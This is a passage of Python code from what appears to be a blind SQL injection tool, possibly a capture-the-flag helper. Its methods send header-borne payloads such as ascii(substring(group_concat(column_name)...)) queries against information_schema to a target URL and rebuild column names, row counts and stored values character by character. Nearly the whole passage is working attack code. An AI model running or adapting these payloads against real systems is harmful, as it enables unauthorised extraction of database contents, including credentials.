                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
    def get_column_name(self,table_name):
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                payload = "1' and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name='{1}' having a={2})#".format(str(i),table_name,str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            payload = "1' and (select count({0}) as a from {1} having a={2})#".format(column_name,table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            payload = "1' and (select length(group_concat({0})) as a from {1} having a={2})#".format(column_name,table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                payload = "1' and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})#".format(column_name,str(i),table_name,str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

